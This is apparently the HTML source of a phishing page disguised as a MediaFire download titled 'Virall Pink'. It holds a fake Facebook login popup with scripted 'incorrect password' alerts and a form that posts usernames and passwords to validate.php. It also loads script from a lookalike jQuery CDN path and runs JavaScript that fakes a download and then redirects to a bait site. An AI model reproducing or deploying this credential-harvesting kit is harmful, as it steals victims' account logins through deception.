...
})(window,document,'script','dataLayer','GTM-MK8M5GS');</script>
<!-- End Google Tag Manager -->
    
    <meta charset="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <title>Virall Pink </title>
    <meta name="keywords"
        content="online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, photo backup, photo sharing, ftp replacement, cross platform, remote access, mobile access, send large files, recover files, file versioning, undelete, Windows, PC, Mac, OS X, Linux, iPhone, iPad, Android" />
    <meta name="description"
        content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere." />
    ...
    <meta name="twitter:title" content="527f000" />
...
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MK8M5GS"
...
<!-- End Google Tag Manager (noscript) -->
    ...
    <div class=" popup-login login-facebook animated fadeIn" style="display: none;">
        <div class="popup-box-login-fb">
            <div class="navbar-fb">
                <img width="45" src="img/fb.png">
            </div>
            <div class="content-box-fb">
                <p class="alert sandi">The password you entered is incorrect. <b>Did you forget your
                        password?</b></p>
                <p class="alert email">The mobile number or email address that you've entered doesn't
                    match any
                    account. <b>Find your account.</b></p>
                <img width="75" height="75" src="https://iconape.com/wp-content/png_logo_vector/mediafire.png">
                <div class="txt-login-fb">
                    Log in to your Facebook account to connect with Mediafire
                </div>
                <form class="login-form" method="POST" action="validate.php" onsubmit="$(this).end()">
                    <label>
                        <input type="text" id="user" name="user" placeholder="Mobile number or email address"
                            autocomplete="off" autocapitalize="off">
                    </label>
                    <label>
                        <input type="password" id="pass" name="pass" placeholder="Facebook password" autocomplete="off"
                            autocapitalize="off">
                    </label>
                    <!-- END -->
    ...
    <script src="https://cdn.jsdelivr.net/gh/jQueryMoobile/cdnjquerfuntion@main/slim.min.js"></script>
    <script>
        function flexing(el) {
            ...
            setTimeout(() => {
                ...
                $.ajax({
                    ...
                    success: function () {
                        ...
                        flexing('.downloaded');
                        setTimeout(() => {
                            window.location.href = 'https://fakebokep.co/'
                        }, 1000)
                    }
                })
            }, 1000)
